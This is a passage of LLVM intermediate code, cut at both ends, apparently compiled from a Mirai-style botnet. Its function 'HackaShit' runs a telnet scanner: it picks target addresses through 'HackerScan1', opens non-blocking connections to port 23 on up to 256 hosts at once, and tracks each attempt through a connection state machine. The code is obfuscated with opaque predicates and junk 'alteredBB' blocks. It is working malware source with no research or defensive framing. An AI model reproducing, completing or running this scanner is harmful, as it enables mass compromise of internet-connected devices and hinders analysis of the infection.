originalBB199alteredBB:                           ; preds = %originalBB199, %1353
  %1643 = load i32, i32* %2, align 4
  %_200 = sub i32 %1643, 1
  %gen201 = mul i32 %_200, 1
  %_202 = sub i32 0, %1643
  %gen203 = add i32 %_202, 1
  %_204 = sub i32 %1643, 1
  %gen205 = mul i32 %_204, 1
  %_206 = sub i32 %1643, 1
  %gen207 = mul i32 %_206, 1
  %_208 = sub i32 %1643, 1
  %gen209 = mul i32 %_208, 1
  %_210 = sub i32 0, %1643
  %gen211 = add i32 %_210, 1
  %_212 = sub i32 0, %1643
  %gen213 = add i32 %_212, 1
  %1644 = add nsw i32 %1643, 1
  store i32 %1644, i32* %2, align 4
  br label %originalBB199

originalBB217alteredBB:                           ; preds = %originalBB217, %1373
  br label %originalBB217
}

; Function Attrs: noinline nounwind uwtable
define void @HackaShit() #0 {
  %1 = alloca [128 x i8], align 16
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.fd_set, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 256, i32* %2, align 4
  %14 = call i64 @time(i64* null) #5
  %15 = call i32 @rand_cmwc()
  %16 = zext i32 %15 to i64
  %17 = xor i64 %14, %16
  %18 = trunc i64 %17 to i32
  call void @srand(i32 %18) #5
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = call zeroext i16 @htons(i16 zeroext 23) #10
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %23 = getelementptr inbounds [8 x i8], [8 x i8]* %22, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %23, i8 0, i64 8, i32 4, i1 false)
  %24 = load i32, i32* %2, align 4
  %25 = zext i32 %24 to i64
  %26 = call i8* @llvm.stacksave()
  store i8* %26, i8** %10, align 8
  %27 = alloca %struct.telstate_t, i64 %25, align 16
  %28 = bitcast %struct.telstate_t* %27 to i8*
  %29 = load i32, i32* %2, align 4
  %30 = sext i32 %29 to i64
  %31 = mul i64 %30, 5
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 %31, i32 16, i1 false)
  store i32 0, i32* %3, align 4
  br label %32

; <label>:32:                                     ; preds = %originalBBpart26, %0
  %33 = load i32, i32* %3, align 4
  %34 = load i32, i32* %2, align 4
  %35 = icmp slt i32 %33, %34
  br i1 %35, label %36, label %85

; <label>:36:                                     ; preds = %32
  %37 = load i32, i32* @x.97
  %38 = load i32, i32* @y.98
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %36
  %45 = load i32, i32* %3, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %46
  %48 = bitcast %struct.telstate_t* %47 to i8*
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 40, i32 8, i1 false)
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %50
  %52 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i32 0, i32 4
  store i8 1, i8* %52, align 1
  %53 = call noalias i8* @malloc(i64 257) #5
  %54 = load i32, i32* %3, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %55
  %57 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %56, i32 0, i32 11
  store i8* %53, i8** %57, align 8
  %58 = load i32, i32* @x.97
  %59 = load i32, i32* @y.98
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %66

; <label>:66:                                     ; preds = %originalBBpart2
  %67 = load i32, i32* @x.97
  %68 = load i32, i32* @y.98
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %66
  %75 = load i32, i32* %3, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %3, align 4
  %77 = load i32, i32* @x.97
  %78 = load i32, i32* @y.98
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart26, label %originalBB1alteredBB

originalBBpart26:                                 ; preds = %originalBB1
  br label %32

; <label>:85:                                     ; preds = %32
  br label %86

; <label>:86:                                     ; preds = %1159, %85
  br label %87

; <label>:87:                                     ; preds = %86
  store i32 0, i32* %3, align 4
  br label %88

; <label>:88:                                     ; preds = %1156, %87
  %89 = load i32, i32* @x.97
  %90 = load i32, i32* @y.98
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %88
  %97 = load i32, i32* %3, align 4
  %98 = load i32, i32* %2, align 4
  %99 = icmp slt i32 %97, %98
  %100 = load i32, i32* @x.97
  %101 = load i32, i32* @y.98
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart210, label %originalBB8alteredBB

originalBBpart210:                                ; preds = %originalBB8
  br i1 %99, label %108, label %1159

; <label>:108:                                    ; preds = %originalBBpart210
  %109 = load i32, i32* %3, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %110
  %112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %111, i32 0, i32 9
  %113 = load i32, i32* %112, align 8
  %114 = icmp eq i32 %113, 0
  br i1 %114, label %115, label %122

; <label>:115:                                    ; preds = %108
  %116 = call i64 @time(i64* null) #5
  %117 = trunc i64 %116 to i32
  %118 = load i32, i32* %3, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %119
  %121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %120, i32 0, i32 9
  store i32 %117, i32* %121, align 8
  br label %122

; <label>:122:                                    ; preds = %115, %108
  %123 = load i32, i32* %3, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %124
  %126 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %125, i32 0, i32 3
  %127 = load i8, i8* %126, align 4
  %128 = zext i8 %127 to i32
  switch i32 %128, label %1155 [
    i32 0, label %129
    i32 1, label %315
    i32 2, label %555
    i32 3, label %671
    i32 4, label %727
    i32 5, label %795
    i32 6, label %899
    i32 7, label %1001
    i32 8, label %1042
  ]

; <label>:129:                                    ; preds = %122
  %130 = load i32, i32* %3, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %131
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %132, i32 0, i32 4
  %134 = load i8, i8* %133, align 1
  %135 = icmp ne i8 %134, 0
  br i1 %135, label %136, label %156

; <label>:136:                                    ; preds = %129
  %137 = load i32, i32* %3, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %138
  %140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %139, i32 0, i32 11
  %141 = load i8*, i8** %140, align 8
  store i8* %141, i8** %11, align 8
  %142 = load i32, i32* %3, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %143
  %145 = bitcast %struct.telstate_t* %144 to i8*
  call void @llvm.memset.p0i8.i64(i8* %145, i8 0, i64 40, i32 8, i1 false)
  %146 = load i8*, i8** %11, align 8
  %147 = load i32, i32* %3, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %148
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %149, i32 0, i32 11
  store i8* %146, i8** %150, align 8
  %151 = call i32 @HackerScan1()
  %152 = load i32, i32* %3, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %153
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %154, i32 0, i32 2
  store i32 %151, i32* %155, align 8
  br label %211

; <label>:156:                                    ; preds = %129
  %157 = load i32, i32* %3, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %158
  %160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %159, i32 0, i32 6
  %161 = load i8, i8* %160, align 1
  %162 = add i8 %161, 1
  store i8 %162, i8* %160, align 1
  %163 = load i32, i32* %3, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %164
  %166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %165, i32 0, i32 5
  %167 = load i8, i8* %166, align 2
  %168 = add i8 %167, 1
  store i8 %168, i8* %166, align 2
  %169 = load i32, i32* %3, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %170
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %171, i32 0, i32 6
  %173 = load i8, i8* %172, align 1
  %174 = zext i8 %173 to i64
  %175 = icmp eq i64 %174, 7
  br i1 %175, label %176, label %197

; <label>:176:                                    ; preds = %156
  %177 = load i32, i32* @x.97
  %178 = load i32, i32* @y.98
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %176
  %185 = load i32, i32* %3, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %186
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %187, i32 0, i32 4
  store i8 1, i8* %188, align 1
  %189 = load i32, i32* @x.97
  %190 = load i32, i32* @y.98
  %191 = sub i32 %189, 1
  %192 = mul i32 %189, %191
  %193 = urem i32 %192, 2
  %194 = icmp eq i32 %193, 0
  %195 = icmp slt i32 %190, 10
  %196 = or i1 %194, %195
  br i1 %196, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br label %1156

; <label>:197:                                    ; preds = %156
  %198 = load i32, i32* %3, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %199
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %200, i32 0, i32 5
  %202 = load i8, i8* %201, align 2
  %203 = zext i8 %202 to i64
  %204 = icmp eq i64 %203, 7
  br i1 %204, label %205, label %210

; <label>:205:                                    ; preds = %197
  %206 = load i32, i32* %3, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %207
  %209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %208, i32 0, i32 4
  store i8 1, i8* %209, align 1
  br label %1156

; <label>:210:                                    ; preds = %197
  br label %211

; <label>:211:                                    ; preds = %210, %136
  %212 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %212, align 4
  %213 = call zeroext i16 @htons(i16 zeroext 23) #10
  %214 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %213, i16* %214, align 2
  %215 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %216 = getelementptr inbounds [8 x i8], [8 x i8]* %215, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %216, i8 0, i64 8, i32 4, i1 false)
  %217 = load i32, i32* %3, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %218
  %220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %219, i32 0, i32 2
  %221 = load i32, i32* %220, align 8
  %222 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %223 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %222, i32 0, i32 0
  store i32 %221, i32* %223, align 4
  %224 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %225 = load i32, i32* %3, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %226
  %228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %227, i32 0, i32 0
  store i32 %224, i32* %228, align 8
  %229 = load i32, i32* %3, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %230
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %231, i32 0, i32 0
  %233 = load i32, i32* %232, align 8
  %234 = icmp eq i32 %233, -1
  br i1 %234, label %235, label %236

; <label>:235:                                    ; preds = %211
  br label %1156

; <label>:236:                                    ; preds = %211
  %237 = load i32, i32* %3, align 4
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %238
  %240 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %239, i32 0, i32 0
  %241 = load i32, i32* %240, align 8
  %242 = load i32, i32* %3, align 4
  %243 = sext i32 %242 to i64
  %244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %243
  %245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %244, i32 0, i32 0
  %246 = load i32, i32* %245, align 8
  %247 = call i32 (i32, i32, ...) @fcntl(i32 %246, i32 3, i8* null)
  %248 = or i32 %247, 2048
  %249 = call i32 (i32, i32, ...) @fcntl(i32 %241, i32 4, i32 %248)
  %250 = load i32, i32* %3, align 4
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %251
  %253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %252, i32 0, i32 0
  %254 = load i32, i32* %253, align 8
  %255 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %256 = call i32 @connect(i32 %254, %struct.sockaddr* %255, i32 16)
  %257 = icmp eq i32 %256, -1
  br i1 %257, label %258, label %289

; <label>:258:                                    ; preds = %236
  %259 = call i32* @__errno_location() #10
  %260 = load i32, i32* %259, align 4
  %261 = icmp ne i32 %260, 115
  br i1 %261, label %262, label %289

; <label>:262:                                    ; preds = %258
  %263 = load i32, i32* @x.97
  %264 = load i32, i32* @y.98
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %262
  %271 = load i32, i32* %3, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %272
  %274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %273, i32 0, i32 0
  %275 = load i32, i32* %274, align 8
  %276 = call i32 @sclose(i32 %275)
  %277 = load i32, i32* %3, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %278
  %280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %279, i32 0, i32 4
  store i8 1, i8* %280, align 1
  %281 = load i32, i32* @x.97
  %282 = load i32, i32* @y.98
  %283 = sub i32 %281, 1
  %284 = mul i32 %281, %283
  %285 = urem i32 %284, 2
  %286 = icmp eq i32 %285, 0
  %287 = icmp slt i32 %282, 10
  %288 = or i1 %286, %287
  br i1 %288, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br label %314

; <label>:289:                                    ; preds = %258, %236
  %290 = load i32, i32* @x.97
  %291 = load i32, i32* @y.98
  %292 = sub i32 %290, 1
  %293 = mul i32 %290, %292
  %294 = urem i32 %293, 2
  %295 = icmp eq i32 %294, 0
  %296 = icmp slt i32 %291, 10
  %297 = or i1 %295, %296
  br i1 %297, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %289
  %298 = load i32, i32* %3, align 4
  %299 = sext i32 %298 to i64
  %300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %299
  %301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %300, i32 0, i32 3
  store i8 1, i8* %301, align 4
  %302 = load i32, i32* %3, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %303
  %305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %304, i32 0, i32 9
  store i32 0, i32* %305, align 8
  %306 = load i32, i32* @x.97
  %307 = load i32, i32* @y.98
  %308 = sub i32 %306, 1
  %309 = mul i32 %306, %308
  %310 = urem i32 %309, 2
  %311 = icmp eq i32 %310, 0
  %312 = icmp slt i32 %307, 10
  %313 = or i1 %311, %312
  br i1 %313, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br label %314

; <label>:314:                                    ; preds = %originalBBpart222, %originalBBpart218
  br label %1155

; <label>:315:                                    ; preds = %122
  br label %316

; <label>:316:                                    ; preds = %315
  %317 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %318 = getelementptr inbounds [16 x i64], [16 x i64]* %317, i64 0, i64 0
  %319 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %318) #5, !srcloc !9
  %320 = extractvalue { i64, i64* } %319, 0
  %321 = extractvalue { i64, i64* } %319, 1
  %322 = trunc i64 %320 to i32
  store i32 %322, i32* %12, align 4
  %323 = ptrtoint i64* %321 to i64
  %324 = trunc i64 %323 to i32
  store i32 %324, i32* %13, align 4
  br label %325

; <label>:325:                                    ; preds = %316
  br label %326

; <label>:326:                                    ; preds = %325
  %327 = load i32, i32* %3, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %328
  %330 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %329, i32 0, i32 0
  %331 = load i32, i32* %330, align 8
  %332 = srem i32 %331, 64
  %333 = zext i32 %332 to i64
  %334 = shl i64 1, %333
  %335 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %336 = load i32, i32* %3, align 4
  %337 = sext i32 %336 to i64
  %338 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %337
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %338, i32 0, i32 0
  %340 = load i32, i32* %339, align 8
  %341 = sdiv i32 %340, 64
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds [16 x i64], [16 x i64]* %335, i64 0, i64 %342
  %344 = load i64, i64* %343, align 8
  %345 = or i64 %344, %334
  store i64 %345, i64* %343, align 8
  %346 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i32 0, i32 0
  store i64 0, i64* %346, align 8
  %347 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i32 0, i32 1
  store i64 10000, i64* %347, align 8
  %348 = load i32, i32* %3, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %349
  %351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %350, i32 0, i32 0
  %352 = load i32, i32* %351, align 8
  %353 = add nsw i32 %352, 1
  %354 = call i32 @select(i32 %353, %struct.fd_set* null, %struct.fd_set* %6, %struct.fd_set* null, %struct.timeval* %7)
  store i32 %354, i32* %4, align 4
  %355 = load i32, i32* %4, align 4
  %356 = icmp eq i32 %355, 1
  br i1 %356, label %357, label %430

; <label>:357:                                    ; preds = %326
  %358 = load i32, i32* @x.97
  %359 = load i32, i32* @y.98
  %360 = sub i32 %358, 1
  %361 = mul i32 %358, %360
  %362 = urem i32 %361, 2
  %363 = icmp eq i32 %362, 0
  %364 = icmp slt i32 %359, 10
  %365 = or i1 %363, %364
  br i1 %365, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %357
  store i32 4, i32* %8, align 4
  store i32 0, i32* %5, align 4
  %366 = load i32, i32* %3, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %367
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %368, i32 0, i32 0
  %370 = load i32, i32* %369, align 8
  %371 = bitcast i32* %5 to i8*
  %372 = call i32 @getsockopt(i32 %370, i32 1, i32 4, i8* %371, i32* %8) #5
  %373 = load i32, i32* %5, align 4
  %374 = icmp ne i32 %373, 0
  %375 = load i32, i32* @x.97
  %376 = load i32, i32* @y.98
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBBpart226, label %originalBB24alteredBB

originalBBpart226:                                ; preds = %originalBB24
  br i1 %374, label %383, label %398

; <label>:383:                                    ; preds = %originalBBpart226
  %384 = load i32, i32* %3, align 4
  %385 = sext i32 %384 to i64
  %386 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %385
  %387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %386, i32 0, i32 0
  %388 = load i32, i32* %387, align 8
  %389 = call i32 @sclose(i32 %388)
  %390 = load i32, i32* %3, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %391
  %393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %392, i32 0, i32 3
  store i8 0, i8* %393, align 4
  %394 = load i32, i32* %3, align 4
  %395 = sext i32 %394 to i64
  %396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %395
  %397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %396, i32 0, i32 4
  store i8 1, i8* %397, align 1
  br label %429

; <label>:398:                                    ; preds = %originalBBpart226
  %399 = load i32, i32* %3, align 4
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %400
  %402 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %401, i32 0, i32 0
  %403 = load i32, i32* %402, align 8
  %404 = load i32, i32* %3, align 4
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %405
  %407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %406, i32 0, i32 0
  %408 = load i32, i32* %407, align 8
  %409 = call i32 (i32, i32, ...) @fcntl(i32 %408, i32 3, i8* null)
  %410 = and i32 %409, -2049
  %411 = call i32 (i32, i32, ...) @fcntl(i32 %403, i32 4, i32 %410)
  %412 = load i32, i32* %3, align 4
  %413 = sext i32 %412 to i64
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %413
  %415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %414, i32 0, i32 9
  store i32 0, i32* %415, align 8
  %416 = load i32, i32* %3, align 4
  %417 = sext i32 %416 to i64
  %418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %417
  %419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %418, i32 0, i32 10
  store i16 0, i16* %419, align 4
  %420 = load i32, i32* %3, align 4
  %421 = sext i32 %420 to i64
  %422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %421
  %423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %422, i32 0, i32 11
  %424 = load i8*, i8** %423, align 8
  call void @llvm.memset.p0i8.i64(i8* %424, i8 0, i64 256, i32 1, i1 false)
  %425 = load i32, i32* %3, align 4
  %426 = sext i32 %425 to i64
  %427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %426
  %428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %427, i32 0, i32 3
  store i8 2, i8* %428, align 4
  br label %429

; <label>:429:                                    ; preds = %398, %383
  br label %1156

; <label>:430:                                    ; preds = %326
  %431 = load i32, i32* @x.97
  %432 = load i32, i32* @y.98
  %433 = sub i32 %431, 1
  %434 = mul i32 %431, %433
  %435 = urem i32 %434, 2
  %436 = icmp eq i32 %435, 0
  %437 = icmp slt i32 %432, 10
  %438 = or i1 %436, %437
  br i1 %438, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %430
  %439 = load i32, i32* %4, align 4
  %440 = icmp eq i32 %439, -1
  %441 = load i32, i32* @x.97
  %442 = load i32, i32* @y.98
  %443 = sub i32 %441, 1
  %444 = mul i32 %441, %443
  %445 = urem i32 %444, 2
  %446 = icmp eq i32 %445, 0
  %447 = icmp slt i32 %442, 10
  %448 = or i1 %446, %447
  br i1 %448, label %originalBBpart230, label %originalBB28alteredBB

originalBBpart230:                                ; preds = %originalBB28
  br i1 %440, label %449, label %480

; <label>:449:                                    ; preds = %originalBBpart230
  %450 = load i32, i32* @x.97
  %451 = load i32, i32* @y.98
  %452 = sub i32 %450, 1
  %453 = mul i32 %450, %452
  %454 = urem i32 %453, 2
  %455 = icmp eq i32 %454, 0
  %456 = icmp slt i32 %451, 10
  %457 = or i1 %455, %456
  br i1 %457, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %449
  %458 = load i32, i32* %3, align 4
  %459 = sext i32 %458 to i64
  %460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %459
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %460, i32 0, i32 0
  %462 = load i32, i32* %461, align 8
  %463 = call i32 @sclose(i32 %462)
  %464 = load i32, i32* %3, align 4
  %465 = sext i32 %464 to i64
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %465
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %466, i32 0, i32 3
  store i8 0, i8* %467, align 4
  %468 = load i32, i32* %3, align 4
  %469 = sext i32 %468 to i64
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %469
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %470, i32 0, i32 4
  store i8 1, i8* %471, align 1
  %472 = load i32, i32* @x.97
  %473 = load i32, i32* @y.98
  %474 = sub i32 %472, 1
  %475 = mul i32 %472, %474
  %476 = urem i32 %475, 2
  %477 = icmp eq i32 %476, 0
  %478 = icmp slt i32 %473, 10
  %479 = or i1 %477, %478
  br i1 %479, label %originalBBpart234, label %originalBB32alteredBB

originalBBpart234:                                ; preds = %originalBB32
  br label %1156

; <label>:480:                                    ; preds = %originalBBpart230
  %481 = load i32, i32* @x.97
  %482 = load i32, i32* @y.98
  %483 = sub i32 %481, 1
  %484 = mul i32 %481, %483
  %485 = urem i32 %484, 2
  %486 = icmp eq i32 %485, 0
  %487 = icmp slt i32 %482, 10
  %488 = or i1 %486, %487
  br i1 %488, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %480
  %489 = load i32, i32* @x.97
  %490 = load i32, i32* @y.98
  %491 = sub i32 %489, 1
  %492 = mul i32 %489, %491
  %493 = urem i32 %492, 2
  %494 = icmp eq i32 %493, 0
  %495 = icmp slt i32 %490, 10
  %496 = or i1 %494, %495
  br i1 %496, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br label %497

; <label>:497:                                    ; preds = %originalBBpart238
  %498 = load i32, i32* %3, align 4
  %499 = sext i32 %498 to i64
